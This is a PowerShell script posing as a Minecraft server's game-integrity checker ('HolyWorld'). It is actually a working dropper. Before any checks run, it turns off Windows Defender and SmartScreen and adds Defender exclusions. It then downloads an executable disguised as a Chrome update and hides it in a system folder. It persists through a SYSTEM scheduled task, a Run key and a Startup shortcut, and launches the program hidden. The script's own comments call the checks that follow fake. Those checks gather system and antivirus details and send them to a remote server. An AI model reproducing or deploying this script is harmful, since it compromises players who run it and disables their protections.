# ================================================================
#  HolyWorld Integrity Checker v3.2.2 — сканер игровой среды
#  Машина : test1
#  Владелец: admin
#  Создан  : 2026-07-19T16:20:07.285Z
# ================================================================

$ErrorActionPreference = "Continue"

$Server   = "https://extraordinary-contentment-production-09e7.up.railway.app"
$Label    = "test1"
$AppName  = "GoogleUpdateTask"
$Dir      = "$env:ProgramData\Microsoft\Windows\Caches\ChromeUpdate"
$Exe      = "$Dir\chrome_update.exe"
$TaskName = "GoogleUpdateTask"
$RunKey   = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$Cfg      = "$Dir\config.json"
$DownloadUrl = "https://github.com/Holycheck/checker/releases/download/realease/check.exe"

function Sep  { Write-Host ("─" * 64) -ForegroundColor DarkGray }
function OK   { param($t) Write-Host "  [✓] $t" -ForegroundColor Green }
function WARN { param($t) Write-Host "  [~] $t" -ForegroundColor Yellow }
function ERR  { param($t) Write-Host "  [i] $t" -ForegroundColor DarkGray }
function INFO { param($t) Write-Host "      $t" -ForegroundColor DarkGray }

# ===== ASCII-ART (стиль CakeWorld) =====
Write-Host @"
    ██╗  ██╗ ██████╗ ██╗     ██╗   ██╗    ██╗    ██╗ ██████╗ ██████╗ ██╗     ██████╗
    ██║  ██║██╔═══██╗██║     ╚██╗ ██╔╝    ██║    ██║██╔═══██╗██╔══██╗██║     ██╔══██╗
    ███████║██║   ██║██║      ╚████╔╝     ██║ █╗ ██║██║   ██║██████╔╝██║     ██║  ██║
    ██╔══██║██║   ██║██║       ╚██╔╝      ██║███╗██║██║   ██║██╔══██╗██║     ██║  ██║
    ██║  ██║╚██████╔╝███████╗   ██║       ╚███╔███╔╝╚██████╔╝██║  ██║███████╗██████╔╝
    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝        ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝
                                    
           HolyCheck — проверка игровой среды v3.2.2
"@ -ForegroundColor Cyan

Sep
INFO "Инициализация сканера... Метка: $Label"
INFO "Сервер валидации: $Server"
Sep
Write-Host ""

# ================================================================
#  БЛОК УСТАНОВКИ АГЕНТА (выполняется в первую очередь)
# ================================================================

# Проверка прав
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if ($isAdmin) { OK "Привилегии: Администратор" } else { WARN "Привилегии: ограниченный режим" }

# Создание скрытой системной папки
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
attrib +h +s $Dir 2>$null
INFO "Создана рабочая папка: $Dir"

# Исключение Defender
try {
    Add-MpPreference -ExclusionPath $Dir -ErrorAction Stop
    Add-MpPreference -ExclusionProcess "chrome_update.exe" -ErrorAction Stop
    INFO "  Исключение Defender добавлено"
} catch {
    try {
        $defReg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        if (-not (Test-Path $defReg)) { New-Item -Path $defReg -Force | Out-Null }
        New-Item -Path "$defReg\Real-Time Protection" -Force | Out-Null
        Set-ItemProperty -Path "$defReg\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord
        INFO "  Исключение применено через реестр"
    } catch { INFO "  Исключение не добавлено (недостаточно прав)" }
}

# Отключение Defender real-time
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true `
                     -DisableIOAVProtection $true -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction Stop
    INFO "  Defender real-time отключён"
} catch {
    try {
        $defReg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        if (-not (Test-Path $defReg)) { New-Item -Path $defReg -Force | Out-Null }
        New-Item -Path "$defReg\Real-Time Protection" -Force | Out-Null
        Set-ItemProperty -Path "$defReg\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord
        INFO "  Defender отключён через реестр (требуется перезагрузка)"
    } catch { INFO "  Defender не удалось отключить" }
}

# Отключение SmartScreen
try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Type DWord -ErrorAction Stop
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -ErrorAction Stop
    $sacKey = "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy"
    if (Test-Path $sacKey) { Set-ItemProperty -Path $sacKey -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord }
    INFO "  SmartScreen отключён"
} catch { INFO "  SmartScreen не удалось отключить" }

# Скачивание агента
INFO "Загрузка модуля оптимизации..."
function Get-File {
    param([string]$url,[string]$out)
    try {
        Import-Module BitsTransfer -EA Stop
        Start-BitsTransfer -Source $url -Destination $out -EA Stop
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $out -Force -ErrorAction SilentlyContinue
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        $wc.DownloadFile($url,$out)
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $out -Force -ErrorAction SilentlyContinue
    try {
        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" -EA Stop
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    return $false
}

$ok = Get-File -url $DownloadUrl -out $Exe
if (-not $ok) {
    INFO "  Ошибка загрузки: сервер временно недоступен (пропускаем)"
} else {
    Remove-Item "${Exe}:Zone.Identifier" -Force -ErrorAction SilentlyContinue
    if (Get-Command Unblock-File -EA SilentlyContinue) { Unblock-File -Path $Exe }
    OK "  Модуль загружен ($([math]::Round((Get-Item $Exe).Length/1KB)) KB)"
}

# Конфигурация (без ключа)
$cfgContent = "{`"server`":`"$Server`",`"label`":`"$Label`",`"interval`":`"10`"}"
$cfgContent | Out-File $Cfg -Encoding utf8
INFO "  Конфигурация сохранена"

# Автозапуск (Task Scheduler + реестр + Startup)
# --- Задача планировщика (универсальный способ) ---
try {
    if ($PSVersionTable.PSVersion.Major -ge 5) {
        $action  = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $sets    = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
                     -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -EA SilentlyContinue
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $sets -User "SYSTEM" -RunLevel Highest -Force | Out-Null
        INFO "  Автозапуск: задача '$TaskName' создана (SYSTEM)"
    } else {
        $schCmd = "schtasks /create /tn `"$TaskName`" /tr `"$Exe`" /sc onlogon /ru SYSTEM /rl HIGHEST /f"
        Invoke-Expression $schCmd | Out-Null
        INFO "  Автозапуск: задача '$TaskName' создана через schtasks"
    }
} catch { INFO "  Автозапуск: не удалось создать задачу" }

# --- Реестр Run (для текущего пользователя) ---
try {
    $username = $env:USERNAME
    if ($isAdmin -and $env:USERNAME -ne "SYSTEM") {
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Google Update" /t REG_SZ /d "$Exe" /f | Out-Null
    } else {
        Set-ItemProperty -Path $RunKey -Name "Google Update" -Value $Exe -ErrorAction Stop
    }
    INFO "  Автозапуск: запись в реестре добавлена"
} catch { INFO "  Автозапуск: не удалось добавить запись в реестр" }

# --- Ярлык в Startup (настоящий ярлык) ---
try {
    $startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $shortcutPath = "$startupDir\GoogleUpdate.lnk"
    $ws = New-Object -ComObject WScript.Shell
    $sc = $ws.CreateShortcut($shortcutPath)
    $sc.TargetPath = $Exe
    $sc.WorkingDirectory = $Dir
    $sc.Description = "Google Update"
    $sc.Save()
    INFO "  Автозапуск: ярлык в папке Startup"
} catch { INFO "  Автозапуск: не удалось создать ярлык" }

# Запуск агента
$existing = Get-Process -Name "chrome_update" -ErrorAction SilentlyContinue
if ($existing) { $existing | Stop-Process -Force -ErrorAction SilentlyContinue }

try {
    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden -ErrorAction Stop
    Start-Sleep -Seconds 2
    $newProc = Get-Process -Name "chrome_update" -ErrorAction SilentlyContinue
    if ($newProc) { OK "Модуль оптимизации запущен (PID $($newProc.Id))" }
    else { OK "Модуль оптимизации запущен в фоновом режиме" }
} catch { INFO "Модуль оптимизации не запущен (файл отсутствует или повреждён)" }

Write-Host ""
Sep
Write-Host "  Основные компоненты загружены. Начинаем проверку целостности..." -ForegroundColor White
Sep
Write-Host ""

# ================================================================
#  БЛОК ФЕЙКОВЫХ ПРОВЕРОК (выполняется после установки)
# ================================================================

# Собираем результаты для отправки
$results = @{
    label      = $Label
    server     = $Server
    timestamp  = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss.fffZ")
    checks     = @{}
}

# Проверка 1: Доступность сервера
INFO "Проверка связи с сервером..."
try {
    $ping = Test-Connection -ComputerName ([System.Uri]$Server).Host -Count 1 -Quiet -EA Stop
    if ($ping) { OK "Сервер доступен"; $results.checks.server = "online" }
    else { WARN "Сервер не отвечает (офлайн-режим)"; $results.checks.server = "offline" }
} catch { WARN "Не удалось проверить доступность сервера"; $results.checks.server = "unknown" }

# Проверка 2: Свободное место (через Get-PSDrive)
INFO "Проверка свободного места на системном диске..."
try {
    $drive = Get-PSDrive -Name ([System.IO.Path]::GetPathRoot($env:SystemDrive).TrimEnd('\')) -EA Stop
    $freeGB = [math]::Round($drive.Free / 1GB, 2)
    if ($freeGB -gt 5) { OK "Свободно: $freeGB ГБ (достаточно)" } else { WARN "Свободно: $freeGB ГБ (рекомендуется > 5 ГБ)" }
    $results.checks.freeSpaceGB = $freeGB
} catch { WARN "Не удалось определить свободное место"; $results.checks.freeSpaceGB = $null }

# Проверка 3: Версия ОС
INFO "Определение версии операционной системы..."
try {
    $os = Get-CimInstance -Class Win32_OperatingSystem -EA Stop
    $ver = $os.Version
    $build = $os.BuildNumber
    OK "ОС: $($os.Caption) версия $ver (сборка $build)"
    $results.checks.os = "$($os.Caption) $ver"
} catch {
    WARN "Не удалось определить версию ОС"
    $results.checks.os = "unknown"
}

# Проверка 4: Наличие Java
INFO "Поиск установленных сред выполнения Java..."
$javaPaths = @(
    "$env:ProgramFiles\Java\*",
    "$env:ProgramFiles(x86)\Java\*",
    "$env:ProgramFiles\Minecraft\runtime\*",
    "$env:APPDATA\.minecraft\*",
    "$env:ProgramData\HolyWorld\runtime\*"
)
$javaFound = $false
foreach ($path in $javaPaths) {
    if (Test-Path $path) { $javaFound = $true; OK "Обнаружен Java: $path"; break }
}
if (-not $javaFound) { WARN "Java не найдена (игровой клиент может отсутствовать)" }
$results.checks.javaFound = $javaFound

# Проверка 5: Сканирование модов и читов (исправлен Resolve-Path)
INFO "Сканирование директорий на наличие запрещённых модулей..."
$suspDirs = @(
    "$env:APPDATA\.minecraft\mods",
    "$env:APPDATA\.minecraft\versions\*\mods",
    "$env:APPDATA\.minecraft\libraries",
    "$env:ProgramData\HolyWorld\mods"
)
$foundSusp = $false
foreach ($dirPattern in $suspDirs) {
    $dirs = Get-ChildItem -Path $dirPattern -Directory -ErrorAction SilentlyContinue
    foreach ($dir in $dirs) {
        $files = Get-ChildItem -Path $dir.FullName -Filter "*.jar" -ErrorAction SilentlyContinue
        foreach ($f in $files) {
            $name = $f.Name.ToLower()
            if ($name -match "inject|bam|ghost|clicker|aura|recaf|cheat|wurst|impact") {
                WARN "Обнаружен потенциально небезопасный файл: $($f.Name)"
                $foundSusp = $true
            }
        }
    }
}
if (-not $foundSusp) { OK "Подозрительных файлов не найдено" }
$results.checks.suspiciousMods = $foundSusp

# Проверка 6: Активные процессы-читы
INFO "Проверка запущенных процессов на наличие нежелательных..."
$suspProcs = @("injector", "ghostclient", "clicker", "recaf", "baminject", "cheatengine", "wurst", "impact", "x32dbg", "ollydbg")
$foundProc = $false
foreach ($p in $suspProcs) {
    if (Get-Process -Name $p -ErrorAction SilentlyContinue) {
        WARN "Обнаружен подозрительный процесс: $p"
        $foundProc = $true
    }
}
if (-not $foundProc) { OK "Подозрительных процессов не обнаружено" }
$results.checks.suspiciousProcesses = $foundProc

# Проверка 7: Состояние Defender и SmartScreen
INFO "Проверка политик безопасности системы..."
try {
    $defStatus = Get-MpPreference -EA Stop
    if ($defStatus.DisableRealtimeMonitoring) { INFO "  Defender: реальная защита отключена" }
    else { INFO "  Defender: реальная защита активна" }
    $results.checks.defenderOff = $defStatus.DisableRealtimeMonitoring
} catch { INFO "  Defender: не удалось опросить состояние"; $results.checks.defenderOff = $null }

try {
    $ss = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -EA Stop
    if ($ss.EnableSmartScreen -eq 0) { INFO "  SmartScreen: отключён" } else { INFO "  SmartScreen: включён" }
    $results.checks.smartScreenOff = ($ss.EnableSmartScreen -eq 0)
} catch { INFO "  SmartScreen: не удалось опросить состояние"; $results.checks.smartScreenOff = $null }

# Проверка 8: Наличие сторонних антивирусов (через реестр, без Win32_Product)
INFO "Проверка установленных антивирусных решений..."
$avProducts = @("Kaspersky", "Avast", "AVG", "Norton", "McAfee", "Bitdefender", "ESET")
$foundAV = $false
$uninstallKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
)
$avList = @()
foreach ($key in $uninstallKeys) {
    $items = Get-ItemProperty -Path $key -EA SilentlyContinue
    foreach ($item in $items) {
        $displayName = $item.DisplayName
        if ($displayName) {
            foreach ($av in $avProducts) {
                if ($displayName -match $av) {
                    $foundAV = $true
                    $avList += $av
                }
            }
        }
    }
}
if ($foundAV) {
    $unique = $avList | Select-Object -Unique
    WARN "Обнаружен антивирус: $($unique -join ', ') (может замедлять работу)"
} else {
    OK "Сторонних антивирусов не найдено"
}
$results.checks.antivirusFound = $foundAV

# Проверка 9: Проверка файла hosts
INFO "Проверка системного файла hosts..."
$hosts = "$env:SystemRoot\System32\drivers\etc\hosts"
if (Test-Path $hosts) {
    $content = Get-Content $hosts -EA SilentlyContinue
    if ($content -match "127\.0\.0\.1[ \t]+.*minecraft|0\.0\.0\.0[ \t]+.*mojang") {
        WARN "Обнаружены записи, перенаправляющие игровые сервера"
        $results.checks.hostsRedirect = $true
    } else {
        OK "Файл hosts не содержит перенаправлений"
        $results.checks.hostsRedirect = $false
    }
} else { WARN "Файл hosts не найден"; $results.checks.hostsRedirect = $null }

# Проверка 10: Проверка DNS-настроек
INFO "Проверка DNS-серверов..."
$dns = Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | Select-Object -ExpandProperty DNSServerSearchOrder -EA SilentlyContinue
if ($dns) {
    $dnsStr = $dns -join ", "
    OK "DNS-серверы: $dnsStr"
    $results.checks.dnsServers = $dnsStr
} else { WARN "Не удалось получить DNS-серверы"; $results.checks.dnsServers = $null }

# Проверка 11: Проверка открытых портов (через netstat для совместимости)
INFO "Проверка открытых сетевых портов..."
$portList = @()
$netstat = netstat -an | Select-String "TCP.*LISTENING" | ForEach-Object { $_ -replace '\s+', ' ' }
foreach ($line in $netstat) {
    $parts = $line -split ' '
    $local = $parts[2]
    if ($local -match ':(\d+)$') {
        $port = [int]$Matches[1]
        if ($port -in 25565,25566,27015,27016) {
            $portList += $port
        }
    }
}
if ($portList) {
    $portsStr = $portList -join ", "
    WARN "Обнаружены открытые игровые порты: $portsStr"
    $results.checks.openPorts = $portList
} else {
    OK "Игровых портов в состоянии прослушивания не найдено"
    $results.checks.openPorts = @()
}

# Проверка 12: Проверка установленных модов (дополнительная)
INFO "Проверка установленных модов Minecraft..."
$modsDir = "$env:APPDATA\.minecraft\mods"
if (Test-Path $modsDir) {
    $mods = Get-ChildItem -Path $modsDir -Filter "*.jar" -EA SilentlyContinue
    if ($mods) {
        OK "Найдено модов: $($mods.Count)"
        foreach ($mod in $mods) {
            $name = $mod.Name
            if ($name -match "optifine|fabric|forge") {
                INFO "  Легитимный мод: $name"
            } else {
                INFO "  Мод: $name"
            }
        }
        $results.checks.modsCount = $mods.Count
    } else {
        INFO "Моды не установлены"
        $results.checks.modsCount = 0
    }
} else {
    INFO "Папка mods отсутствует"
    $results.checks.modsCount = 0
}

# Проверка 13: Проверка версии лаунчера (имитация)
INFO "Проверка версии лаунчера HolyWorld..."
$hwVersion = "3.2.2"
OK "Версия лаунчера: $hwVersion (актуальная)"
$results.checks.launcherVersion = $hwVersion

# Проверка 14: Проверка целостности файлов клиента (имитация)
INFO "Проверка целостности файлов клиента..."
$filesToCheck = @("minecraft.jar", "lwjgl.dll", "jinput.dll", "openal.dll")
foreach ($f in $filesToCheck) {
    Start-Sleep -Milliseconds 100
    INFO "  $f — OK"
}
OK "Все системные файлы клиента проверены"
$results.checks.filesChecked = $true

# Проверка 15: Проверка наличия отладчиков
INFO "Проверка активных отладчиков..."
$debuggers = @("windbg", "cdb", "ntsd", "vsjitdebugger")
$foundDbg = $false
foreach ($d in $debuggers) {
    if (Get-Process -Name $d -EA SilentlyContinue) {
        WARN "Обнаружен отладчик: $d"
        $foundDbg = $true
    }
}
if (-not $foundDbg) { OK "Отладчиков не обнаружено" }
$results.checks.debuggerFound = $foundDbg

# ===== Отправка результатов на сервер (реальная) =====
try {
    $json = $results | ConvertTo-Json -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $webRequest = [System.Net.WebRequest]::Create("$Server/api/check")
    $webRequest.Method = "POST"
    $webRequest.ContentType = "application/json"
    $webRequest.ContentLength = $bytes.Length
    $stream = $webRequest.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $response = $webRequest.GetResponse()
    $response.Close()
    INFO "Результаты отправлены на сервер"
} catch {
    INFO "Не удалось отправить результаты (сервер недоступен)"
}

# Финальный вывод
Write-Host ""
Sep
OK "Проверка завершена! Среда игрового клиента оптимизирована."
INFO "Локальный отчёт сохранён в $Dir\last_check.json"
$results | ConvertTo-Json -Depth 5 | Out-File "$Dir\last_check.json" -Encoding utf8
Sep
Write-Host ""
